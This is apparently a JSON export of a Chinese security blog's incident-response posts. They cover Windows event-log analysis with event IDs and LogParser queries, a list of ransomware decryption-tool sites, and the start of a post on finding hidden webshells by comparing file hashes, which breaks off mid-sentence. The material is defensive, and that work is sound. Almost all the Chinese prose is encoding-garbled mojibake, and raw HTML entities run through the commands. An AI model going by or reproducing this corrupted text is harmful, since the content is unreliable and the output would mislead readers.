æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—æ–¹æ³•ï¼š åœ¨â€œå¼€å§‹â€èœå•ä¸Šï¼Œä¾æ¬¡æŒ‡å‘â€œæ‰€æœ‰ç¨‹åºâ€ã€â€œç®¡ç†å·¥å…·â€ï¼Œç„¶åå•å‡»â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ æŒ‰ â€œWindow+Râ€œï¼Œè¾“å…¥ â€eventvwr.mscâ€œ ä¹Ÿå¯ä»¥ç›´æ¥è¿›å…¥â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ ä¸‰ã€äº‹ä»¶æ—¥å¿—åˆ†æå¯¹äºWindowsäº‹ä»¶æ—¥å¿—åˆ†æï¼Œä¸åŒçš„EVENT IDä»£è¡¨äº†ä¸åŒçš„æ„ä¹‰ï¼Œæ‘˜å½•ä¸€äº›å¸¸è§çš„å®‰å…¨äº‹ä»¶çš„è¯´æ˜ï¼š äº‹ä»¶ID è¯´æ˜ 4624 ç™»å½•æˆåŠŸ 4625 ç™»å½•å¤±è´¥ 4634 æ³¨é”€æˆåŠŸ 4647 ç”¨æˆ·å¯åŠ¨çš„æ³¨é”€ 4672 ä½¿ç”¨è¶…çº§ç”¨æˆ·ï¼ˆå¦‚ç®¡ç†å‘˜ï¼‰è¿›è¡Œç™»å½• 4720 åˆ›å»ºç”¨æˆ· æ¯ä¸ªæˆåŠŸç™»å½•çš„äº‹ä»¶éƒ½ä¼šæ ‡è®°ä¸€ä¸ªç™»å½•ç±»å‹ï¼Œä¸åŒç™»å½•ç±»å‹ä»£è¡¨ä¸åŒçš„æ–¹å¼ï¼š ç™»å½•ç±»å‹ æè¿° è¯´æ˜ 2 äº¤äº’å¼ç™»å½•ï¼ˆInteractiveï¼‰ ç”¨æˆ·åœ¨æœ¬åœ°è¿›è¡Œç™»å½•ã€‚ 3 ç½‘ç»œï¼ˆNetworkï¼‰ æœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯è¿æ¥åˆ°å…±äº«æ–‡ä»¶å¤¹æˆ–å…±äº«æ‰“å°æœºæ—¶ã€‚ 4 æ‰¹å¤„ç†ï¼ˆBatchï¼‰ é€šå¸¸è¡¨æ˜æŸè®¡åˆ’ä»»åŠ¡å¯åŠ¨ã€‚ 5 æœåŠ¡ï¼ˆServiceï¼‰ æ¯ç§æœåŠ¡éƒ½è¢«é…ç½®åœ¨æŸä¸ªç‰¹å®šçš„ç”¨æˆ·è´¦å·ä¸‹è¿è¡Œã€‚ 7 è§£é”ï¼ˆUnlockï¼‰ å±ä¿è§£é”ã€‚ 8 ç½‘ç»œæ˜æ–‡ï¼ˆNetworkCleartextï¼‰ ç™»å½•çš„å¯†ç åœ¨ç½‘ç»œä¸Šæ˜¯é€šè¿‡æ˜æ–‡ä¼ è¾“çš„ï¼Œå¦‚FTPã€‚ 9 æ–°å‡­è¯ï¼ˆNewCredentialsï¼‰ ä½¿ç”¨å¸¦/Netonlyå‚æ•°çš„RUNASå‘½ä»¤è¿è¡Œä¸€ä¸ªç¨‹åºã€‚ 10 è¿œç¨‹äº¤äº’ï¼Œï¼ˆRemoteInteractiveï¼‰ é€šè¿‡ç»ˆç«¯æœåŠ¡ã€è¿œç¨‹æ¡Œé¢æˆ–è¿œç¨‹ååŠ©è®¿é—®è®¡ç®—æœºã€‚ 11 ç¼“å­˜äº¤äº’ï¼ˆCachedInteractiveï¼‰ ä»¥ä¸€ä¸ªåŸŸç”¨æˆ·ç™»å½•è€Œåˆæ²¡æœ‰åŸŸæ§åˆ¶å™¨å¯ç”¨ å…³äºæ›´å¤šEVENT IDï¼Œè¯¦è§å¾®è½¯å®˜æ–¹ç½‘ç«™ä¸Šæ‰¾åˆ°â€œWindows Vista å’Œ Windows Server 2008 ä¸­çš„å®‰å…¨äº‹ä»¶çš„è¯´æ˜â€ã€‚ åŸæ–‡é“¾æ¥ ï¼šhttps://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 æ¡ˆä¾‹1ï¼šåˆ©ç”¨eventlogäº‹ä»¶æ¥æŸ¥çœ‹ç³»ç»Ÿè´¦å·ç™»å½•æƒ…å†µ åœ¨â€œå¼€å§‹â€èœå•ä¸Šï¼Œä¾æ¬¡æŒ‡å‘â€œæ‰€æœ‰ç¨‹åºâ€ã€â€œç®¡ç†å·¥å…·â€ï¼Œç„¶åå•å‡»â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ï¼› åœ¨äº‹ä»¶æŸ¥çœ‹å™¨ä¸­ï¼Œå•å‡»â€œå®‰å…¨â€ï¼ŒæŸ¥çœ‹å®‰å…¨æ—¥å¿—ï¼› åœ¨å®‰å…¨æ—¥å¿—å³ä¾§æ“ä½œä¸­ï¼Œç‚¹å‡»â€œç­›é€‰å½“å‰æ—¥å¿—â€ï¼Œè¾“å…¥äº‹ä»¶IDè¿›è¡Œç­›é€‰ã€‚4624 â€“ç™»å½•æˆåŠŸ4625 â€“ç™»å½•å¤±è´¥4634 â€“ æ³¨é”€æˆåŠŸ4647 â€“ ç”¨æˆ·å¯åŠ¨çš„æ³¨é”€4672 â€“ ä½¿ç”¨è¶…çº§ç”¨æˆ·ï¼ˆå¦‚ç®¡ç†å‘˜ï¼‰è¿›è¡Œç™»å½• æˆ‘ä»¬è¾“å…¥äº‹ä»¶IDï¼š4625è¿›è¡Œæ—¥å¿—ç­›é€‰ï¼Œå‘ç°äº‹ä»¶IDï¼š4625ï¼Œäº‹ä»¶æ•°175904ï¼Œå³ç”¨æˆ·ç™»å½•å¤±è´¥äº†175904æ¬¡ï¼Œé‚£ä¹ˆè¿™å°æœåŠ¡å™¨ç®¡ç†å‘˜è´¦å·å¯èƒ½é­é‡äº†æš´åŠ›çŒœè§£ã€‚ æ¡ˆä¾‹2ï¼šåˆ©ç”¨eventlogäº‹ä»¶æ¥æŸ¥çœ‹è®¡ç®—æœºå¼€å…³æœºçš„è®°å½•1ã€åœ¨â€œå¼€å§‹â€èœå•ä¸Šï¼Œä¾æ¬¡æŒ‡å‘â€œæ‰€æœ‰ç¨‹åºâ€ã€â€œç®¡ç†å·¥å…·â€ï¼Œç„¶åå•å‡»â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ï¼› 2ã€åœ¨äº‹ä»¶æŸ¥çœ‹å™¨ä¸­ï¼Œå•å‡»â€œç³»ç»Ÿâ€ï¼ŒæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ï¼› 3ã€åœ¨ç³»ç»Ÿæ—¥å¿—å³ä¾§æ“ä½œä¸­ï¼Œç‚¹å‡»â€œç­›é€‰å½“å‰æ—¥å¿—â€ï¼Œè¾“å…¥äº‹ä»¶IDè¿›è¡Œç­›é€‰ã€‚ å…¶ä¸­äº‹ä»¶ID 6006 ID6005ã€ ID 6009å°±è¡¨ç¤ºä¸åŒçŠ¶æ€çš„æœºå™¨çš„æƒ…å†µï¼ˆå¼€å…³æœºï¼‰ã€‚6005 ä¿¡æ¯ EventLog äº‹ä»¶æ—¥å¿—æœåŠ¡å·²å¯åŠ¨ã€‚(å¼€æœº)6006 ä¿¡æ¯ EventLog äº‹ä»¶æ—¥å¿—æœåŠ¡å·²åœæ­¢ã€‚(å…³æœº)6009 ä¿¡æ¯ EventLog æŒ‰ctrlã€altã€deleteé”®(éæ­£å¸¸)å…³æœº æˆ‘ä»¬è¾“å…¥äº‹ä»¶IDï¼š6005-6006è¿›è¡Œæ—¥å¿—ç­›é€‰ï¼Œå‘ç°äº†ä¸¤æ¡åœ¨2018/7/6 17:53:51å·¦å³çš„è®°å½•ï¼Œä¹Ÿå°±æ˜¯æˆ‘åˆšæ‰å¯¹ç³»ç»Ÿè¿›è¡Œé‡å¯çš„æ—¶é—´ã€‚ å››ã€æ—¥å¿—åˆ†æå·¥å…·1ã€Log ParserLog Parserï¼ˆæ˜¯å¾®è½¯å…¬å¸å‡ºå“çš„æ—¥å¿—åˆ†æå·¥å…·ï¼Œå®ƒåŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨ç®€å•ï¼Œå¯ä»¥åˆ†æåŸºäºæ–‡æœ¬çš„æ—¥å¿—æ–‡ä»¶ã€XML æ–‡ä»¶ã€CSVï¼ˆé€—å·åˆ†éš”ç¬¦ï¼‰æ–‡ä»¶ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ã€æ³¨å†Œè¡¨ã€æ–‡ä»¶ç³»ç»Ÿã€Active Directoryã€‚å®ƒå¯ä»¥åƒä½¿ç”¨ SQL è¯­å¥ä¸€æ ·æŸ¥è¯¢åˆ†æè¿™äº›æ•°æ®ï¼Œç”šè‡³å¯ä»¥æŠŠåˆ†æç»“æœä»¥å„ç§å›¾è¡¨çš„å½¢å¼å±•ç°å‡ºæ¥ã€‚ Log Parser 2.2ä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser ä½¿ç”¨ç¤ºä¾‹ï¼šhttps://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ ï¼ˆ1ï¼‰åŸºæœ¬æŸ¥è¯¢ç»“æ„Logparser.exe â€“i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:\\xx.evtx&quot; ï¼ˆ2ï¼‰ä½¿ç”¨Log Parseråˆ†ææ—¥å¿—â‘  æŸ¥è¯¢ç™»å½•æˆåŠŸçš„äº‹ä»¶ç™»å½•æˆåŠŸçš„æ‰€æœ‰äº‹ä»¶LogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:\\Security.evtx where EventID=4624&quot;æŒ‡å®šç™»å½•æ—¶é—´èŒƒå›´çš„äº‹ä»¶ï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;æå–ç™»å½•æˆåŠŸçš„ç”¨æˆ·åå’ŒIPï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot; â‘¡ æŸ¥è¯¢ç™»å½•å¤±è´¥çš„äº‹ä»¶ç™»å½•å¤±è´¥çš„æ‰€æœ‰äº‹ä»¶ï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:\\Security.evtx where EventID=4625&quot;æå–ç™»å½•å¤±è´¥ç”¨æˆ·åè¿›è¡Œèšåˆç»Ÿè®¡ï¼šLogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message&quot; â‘£ ç³»ç»Ÿå†å²å¼€å…³æœºè®°å½•ï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006&quot; 2ã€LogParser Lizardå¯¹äºGUIç¯å¢ƒçš„Log Parser Lizardï¼Œå…¶ç‰¹ç‚¹æ˜¯æ¯”è¾ƒæ˜“äºä½¿ç”¨ï¼Œç”šè‡³ä¸éœ€è¦è®°å¿†ç¹ççš„å‘½ä»¤ï¼Œåªéœ€è¦åšå¥½è®¾ç½®ï¼Œå†™å¥½åŸºæœ¬çš„SQLè¯­å¥ï¼Œå°±å¯ä»¥ç›´è§‚çš„å¾—åˆ°ç»“æœã€‚ ä¸‹è½½åœ°å€ï¼šhttp://www.lizard-labs.com/log_parser_lizard.aspx ä¾èµ–åŒ…ï¼šMicrosoft .NET Framework 4 .5ï¼Œä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/en-us/download/details.aspx?id=42642 æŸ¥è¯¢æœ€è¿‘ç”¨æˆ·ç™»å½•æƒ…å†µï¼š 3ã€Event Log ExplorerEvent Log Exploreræ˜¯ä¸€æ¬¾éå¸¸å¥½ç”¨çš„Windowsæ—¥å¿—åˆ†æå·¥å…·ã€‚å¯ç”¨äºæŸ¥çœ‹ï¼Œç›‘è§†å’Œåˆ†æè·Ÿäº‹ä»¶è®°å½•ï¼ŒåŒ…æ‹¬å®‰å…¨ï¼Œç³»ç»Ÿï¼Œåº”ç”¨ç¨‹åºå’Œå…¶ä»–å¾®è½¯Windows çš„è®°å½•è¢«è®°è½½çš„äº‹ä»¶ï¼Œå…¶å¼ºå¤§çš„è¿‡æ»¤åŠŸèƒ½å¯ä»¥å¿«é€Ÿçš„è¿‡æ»¤å‡ºæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚ ä¸‹è½½åœ°å€ï¼šhttps://event-log-explorer.en.softonic.com/ äº”ã€å‚è€ƒé“¾æ¥ï¼š Windowsæ—¥å¿—åˆ†æ https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"æ—¥å¿—åˆ†æ","slug":"æ—¥å¿—åˆ†æ","permalink":"https://wolke.cn/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}],"author":"w01ke"},{"title":"å‹’ç´¢ç—…æ¯’è‡ªæ•‘æŒ‡å—","slug":"å‹’ç´¢ç—…æ¯’è‡ªæ•‘æŒ‡å—","date":"2022-04-01T13:55:26.000Z","updated":"2022-04-01T14:04:12.393Z","comments":true,"path":"post/471da697.html","link":"","permalink":"https://wolke.cn/post/471da697.html","excerpt":"","text":"ä¸€ã€å‰è¨€ç»å¸¸ä¼šæœ‰ä¸€äº›å°ä¼™ä¼´é—®ï¼šä¸­äº†å‹’ç´¢ç—…æ¯’ï¼Œè¯¥æ€ä¹ˆåŠï¼Œå¯ä»¥è§£å¯†å—ï¼Ÿ ç¬¬ä¸€æ¬¡é‡åˆ°å‹’ç´¢ç—…æ¯’æ˜¯åœ¨æ—©å‡ å¹´çš„æ—¶å€™ï¼Œå®¢æˆ·å› ç½‘ç«™è®¿é—®å¼‚å¸¸ï¼Œè¿›è€Œè¿œç¨‹ååŠ©è¿›è¡Œæ’æŸ¥ã€‚ç™»å½•æœåŠ¡å™¨ï¼Œåœ¨ç«™ç‚¹ç›®å½•ä¸‹å‘ç°æ‰€æœ‰çš„è„šæœ¬æ–‡ä»¶åŠé™„ä»¶åç¼€åè¢«ç¯¡æ”¹ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹éƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶æ‰“å¼€åæ˜¾ç¤ºå‹’ç´¢æç¤ºä¿¡æ¯ï¼Œè¿™ä¾¿æ˜¯å‹’ç´¢ç—…æ¯’çš„ç‰¹å¾ã€‚ å‡ºäºèŒä¸šä¹ æƒ¯ï¼Œæˆ‘æ‰“åŒ…äº†éƒ¨åˆ†åŠ å¯†æ–‡ä»¶æ ·æœ¬å’Œå‹’ç´¢ç—…æ¯’æç¤ºä¿¡æ¯ç”¨äºç•™æ¡£ï¼Œå°±åœ¨ä»Šå¤©ï¼Œæˆ‘åˆé‡æ–°ä¸Šä¼ äº†æ ·æœ¬ï¼Œè‡³ä»Šä¾ç„¶æ— æ³•è§£å¯†ã€‚ ä½œä¸ºä¸€ä¸ªå®‰å…¨å·¥ç¨‹å¸ˆï¼Œè€Œéä¸€ä¸ªä¸“ä¸šçš„ç—…æ¯’åˆ†æå¸ˆï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©å„å¤§å®‰å…¨å…¬å¸çš„èƒ½åŠ›ï¼Œå¯»æ‰¾å‹’ç´¢ç—…æ¯’çš„è§£å¯†å·¥å…·ã€‚ æœ¬æ–‡æ•´ç†äº†ä¸€ä»½å‹’ç´¢ç—…æ¯’è‡ªæ•‘æŒ‡å—ï¼Œé€šè¿‡å‹’ç´¢ç—…æ¯’ç´¢å¼•å¼•æ“æŸ¥æ‰¾å‹’ç´¢ç—…æ¯’ç›¸å…³ä¿¡æ¯ï¼Œå†é€šè¿‡å„ä¸ªå®‰å…¨å…¬å¸æä¾›çš„å…è´¹å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·è§£å¯†ã€‚å½“ç„¶ï¼Œèƒ½å¦è§£å¯†å…¨å‡­è¿æ°”ï¼Œsoï¼Œå¹³æ—¶è¿˜æ˜¯å‹¤æ‰“è¡¥ä¸å¤šå¤‡ä»½ã€‚ äºŒã€å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“åœ¨å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“è¾“å…¥ç—…æ¯’åã€å‹’ç´¢é‚®ç®±ã€è¢«åŠ å¯†åæ–‡ä»¶çš„åç¼€åï¼Œæˆ–ç›´æ¥ä¸Šä¼ è¢«åŠ å¯†æ–‡ä»¶ã€å‹’ç´¢æç¤ºä¿¡æ¯ï¼Œå³å¯å¯å¿«é€ŸæŸ¥æ‰¾ åˆ°ç—…æ¯’è¯¦æƒ…å’Œè§£å¯†å·¥å…·ã€‚ è¿™äº›ç½‘ç«™çš„è§£å¯†èƒ½åŠ›è¿˜åœ¨æŒç»­æ›´æ–°ä¸­ï¼Œæ˜¯å€¼å¾—æ”¶è—çš„å‡ ä¸ªå‹’ç´¢ç—…æ¯’å·¥å…·å‹ç½‘ç«™ã€‚ ã€360ã€‘ å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ï¼Œæ”¯æŒæ£€ç´¢è¶…è¿‡800ç§å¸¸è§å‹’ç´¢ç—…æ¯’ å®˜ç½‘ï¼šhttp://lesuobingdu.360.cn ã€è…¾è®¯ã€‘ å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ï¼Œæ”¯æŒæ£€ç´¢è¶…è¿‡ 300 ç§å¸¸è§å‹’ç´¢ç—…æ¯’ å®˜ç½‘ï¼šhttps://guanjia.qq.com/pr/ls ã€å¯æ˜ã€‘VenusEyeå‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ï¼Œè¶…300ç§å‹’ç´¢ç—…æ¯’å®¶æ— å®˜ç½‘ï¼šhttps://lesuo.venuseye.com.cn ã€å¥‡å®‰ä¿¡ã€‘å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ å®˜ç½‘ï¼šhttps://lesuobingdu.qianxin.com ã€æ·±ä¿¡æœã€‘å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ å®˜ç½‘ï¼šhttps://edr.sangfor.com.cn/#/information/ransom_search ä¸‰ã€å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›†å¾ˆå¤šå®‰å…¨å…¬å¸éƒ½æä¾›äº†å…è´¹çš„å‹’ç´¢ç—…æ¯’è§£å¯†å·¥å…·ä¸‹è½½ï¼Œæ”¶é›†å’Œæ•´ç†ç›¸å…³ä¸‹è½½åœ°å€ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£å’Œè·å–æœ€æ–°çš„å‹’ç´¢ç—…æ¯’è§£å¯†å·¥å…·ã€‚ ã€è…¾è®¯å“ˆå‹ƒã€‘å‹’ç´¢è½¯ä»¶ä¸“æ€å·¥å…· å®˜ç½‘ï¼šhttps://habo.qq.com/tool ã€é‡‘å±±æ¯’éœ¸ã€‘å‹’ç´¢ç—…æ¯’å…ç–«å·¥å…· å®˜ç½‘ï¼šhttp://www.duba.net/dbt/wannacry.html ã€ç«ç»’ã€‘å®‰å…¨å·¥å…·ä¸‹è½½ å®˜ç½‘ï¼šhttp://bbs.huorong.cn/forum-55-1.html ã€ç‘æ˜Ÿã€‘è§£å¯†å·¥å…·ä¸‹è½½ å®˜ç½‘ï¼šhttp://it.rising.com.cn/fanglesuo/index.html ã€nomoreransomã€‘å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›† å®˜ç½‘ï¼šhttps://www.nomoreransom.org/zh/index.html ã€MalwareHunterTeamã€‘å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›† å®˜ç½‘ï¼šhttps://id-ransomware.malwarehunterteam.com ã€å¡å·´æ–¯åŸºã€‘å…è´¹å‹’ç´¢è§£å¯†å™¨ å®˜ç½‘ï¼šhttps://noransom.kaspersky.com ã€Avastã€‘å…è´¹å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…· å®˜ç½‘ï¼šhttps://www.avast.com/zh-cn/ransomware-decryption-tools ã€Emsisoftã€‘å…è´¹å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…· å®˜ç½‘ï¼šhttps://www.emsisoft.com/ransomware-decryption-tools/free-download ã€GitHub é¡¹ç›®ã€‘å‹’ç´¢ç—…æ¯’è§£å¯†å·¥å…·æ”¶é›†æ±‡æ€» å®˜ç½‘ï¼šhttps://github.com/jiansiting/Decryption-Tools","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"å¦‚ä½•å‘ç°éšè—çš„WebShellåé—¨","slug":"å¦‚ä½•å‘ç°éšè—çš„WebShellåé—¨","date":"2022-04-01T13:22:46.000Z","updated":"2022-04-01T13:57:31.043Z","comments":true,"path":"post/5542d8c4.html","link":"","permalink":"https://wolke.cn/post/5542d8c4.html","excerpt":"","text":"ä¸€ã€å‰è¨€å¦‚ä½•åœ¨ç™¾ä¸‡è¡Œä»£ç é‡Œå‘ç°éšè—çš„åé—¨ï¼Ÿ è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœä½ çš„ç½‘ç«™è¢«å…¥ä¾µï¼Œæ”»å‡»è€…ç•™ä¸‹éšè—çš„åé—¨ï¼Œä½ çœŸçš„éƒ½å¯ä»¥æ‰¾å‡ºæ¥å—ï¼Ÿé¢å¯¹ä¸€ä¸ªå¤§ä¸­å‹çš„åº”ç”¨ç³»ç»Ÿï¼Œæ•°ä»¥ç™¾ä¸‡çº§çš„ä»£ç è¡Œï¼Œæ˜¯ä¸å¯èƒ½åšåˆ°æ¯ä¸ªæ–‡ä»¶æ¯æ®µä»£ç è¿›è¡Œæ‰‹å·¥æ£€æŸ¥çš„ã€‚ å³ä½¿æ˜¯ä¸€æ¬¾æ‹¥æœ‰ 99.9% çš„ Webshell æ£€å‡ºç‡çš„æ£€æµ‹å¼•æ“ï¼Œä¾ç„¶å¯èƒ½å­˜åœ¨ Webshell ç»•è¿‡çš„æƒ…å†µã€‚å¦å¤–ï¼Œåƒæš—é“¾ã€ç½‘é¡µåŠ«æŒã€é¡µé¢è·³è½¬ç­‰å¸¸è§çš„é»‘å¸½ SEO æ‰‹æ³•ï¼Œä¹Ÿå¾ˆéš¾é€šè¿‡æ‰‹åŠ¨æ£€æµ‹æˆ–å·¥å…·æ£€æµ‹å…¨éƒ¨è¯†åˆ«å‡ºæ¥ã€‚ æœ€å¥½çš„æ–¹å¼å°±æ˜¯åšæ–‡ä»¶å®Œæ•´æ€§éªŒè¯ã€‚é€šè¿‡ä¸åŸå§‹ä»£ç å¯¹æ¯”ï¼Œå¯ä»¥å¿«é€Ÿå‘ç°æ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹ä»¥åŠè¢«ç¯¡æ”¹çš„ä½ç½®ã€‚å½“ç„¶ï¼Œç¬¬ä¸€ä¸ªå‰ææ˜¯ï¼Œä½ æ‰€åœ¨çš„å›¢é˜Ÿå·²å…·å¤‡ä»£ç ç‰ˆæœ¬ç®¡ç†çš„èƒ½åŠ›ï¼Œå¦‚æœä½ æ˜¯ä¸ªäººç«™é•¿ï¼Œç›¸ä¿¡ä½ å·²ç»å¤‡ä»½äº†åŸå§‹ä»£ç ã€‚ æœ¬æ–‡å°†ç»“åˆå®é™…åº”ç”¨ï¼Œä»‹ç»å‡ ç§æ–‡ä»¶å®Œæ•´æ€§éªŒè¯æ–¹å¼ï¼Œå¯ä»¥å¸®åŠ©ä½ æ‰¾å‡ºä»£ç ä¸­æ‰€æœ‰éšè—çš„åé—¨ã€‚ äºŒã€æ–¹æ³•1ã€æ–‡ä»¶ MD5 æ ¡éªŒä¸‹è½½Dç›¾_WebæŸ¥æ€å·¥å…·çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç•™æ„åˆ°ä¸‹è½½çš„å‹ç¼©åŒ…é‡Œï¼Œé™¤äº†æœ‰ä¸€ä¸ª exe å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶ md5 å€¼ã€‚è¿™ä¸ªæ˜¯è½¯ä»¶ä½œè€…åœ¨å‘å¸ƒè½¯ä»¶æ—¶ï¼Œé€šè¿‡ md5 ç®—æ³•è®¡ç®—å‡ºè¯¥ exe æ–‡ä»¶çš„â€ç‰¹å¾å€¼â€ã€‚ ä¸‹è½½åœ°å€ï¼šhttp://www.d99net.net/down/WebShellKill_V2.0.9.zipæ–‡ä»¶ MD5ï¼š29285decadbce3918a4f8429ec33df46 WebShellKill.exe å½“ç”¨æˆ·ä¸‹è½½è½¯ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ ¡éªŒç®—æ³•è®¡ç®—ä¸‹è½½åˆ° exe æ–‡ä»¶çš„ç‰¹å¾å€¼ï¼Œå¹¶ä¸è½¯ä»¶å¼€å‘è€…å‘å¸ƒçš„ç‰¹å¾å€¼æ¯”è¾ƒã€‚å¦‚æœä¸¤ä¸ªç‰¹å¾å€¼ç›¸åŒï¼Œåˆ™è®¤ä¸ºä¸‹è½½åˆ°çš„ exe æ–‡ä»¶æ˜¯æ­£ç¡®çš„ã€‚å¦‚æœä¸¤ä¸ªç‰¹å¾å€¼ä¸åŒï¼Œåˆ™è®¤ä¸ºä¸‹è½½åˆ° exe æ–‡ä»¶æ˜¯è¢«ç¯¡æ”¹è¿‡çš„ã€‚ é‚£åŒç†å¯å¾—ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰ç½‘ç«™æ–‡ä»¶è®¡ç®—ä¸€æ¬¡ hash å€¼ä¿å­˜ï¼Œå½“å‡ºç°åº”æ€¥æƒ…å†µæ—¶ï¼Œé‡æ–°è®¡ç®—ä¸€æ¬¡ hash å€¼ï¼Œå¹¶ä¸ä¸Šæ¬¡ä¿å­˜çš„ hash å€¼è¿›è¡Œå¯¹æ¯”ï¼Œä»è€Œè¾“å‡ºæ–°åˆ›å»ºçš„ã€ä¿®æ”¹è¿‡åŠåˆ é™¤çš„æ–‡ä»¶åˆ—è¡¨ã€‚ æ–‡ä»¶ hash å€¼è®¡ç®—ï¼š def md5sum(file): m = hashlib.md5() # è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡ if os.path.isfile(file): f = open(file,&#x27;rb&#x27;) # å› ä¸ºhashlibæ˜¯å¯¹äºŒè¿›åˆ¶è¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœç›´æ¥å¯¹å­—ç¬¦ä¸²åŠ å¯†çš„è¯ï¼Œä¼šæŠ¥é”™çš„ã€‚å› æ­¤éœ€è¦é€šè¿‡encodeå°†å­—ç¬¦ä¸²è½¬ç æˆäºŒè¿›åˆ¶æ ¼å¼æˆ–è€…ç›´æ¥ç”¨äºŒè¿›åˆ¶æ‰“å¼€ for line in f: m.update(line) # åˆ¶å®šéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œå°±æ˜¯æŠŠæ¯ä¸€è¡Œéƒ½åŠ å¯† f.close else: m.update(file) return (m.hexdigest()) # è¿”å›åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸² å¯¹æ–‡ä»¶è¿›è¡Œå“ˆå¸Œå€¼é‡æ–°è®¡ç®—ï¼Œè¿›è¡Œæ ¡éªŒå¯¹æ¯”ï¼Œæµ‹è¯•æ•ˆæœï¼š å¦‚ä¸Šå›¾ï¼Œåœ¨ä¸Šä¼ ç›®å½•æ–°å¢äº†ä¸€ä¸ª evil.php æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªè¢«ç¯¡æ”¹çš„æ–‡ä»¶æ˜¯ low.php ã€‚ä½¿ç”¨å¸¸è§çš„ç¼–è¾‘å™¨ Notepad++ è¿›è¡Œå¯¹æ¯”ï¼Œå¯ä»¥å‘ç° low.php æ–‡ä»¶é‡Œè¢«æ’å…¥äº†ä¸€å¥è¯ WebShellã€‚ 2ã€diff å‘½ä»¤åœ¨ Linux ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨ diff å‘½ä»¤æ¥æ¯”è¾ƒä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å·®å¼‚ã€‚åŒæ 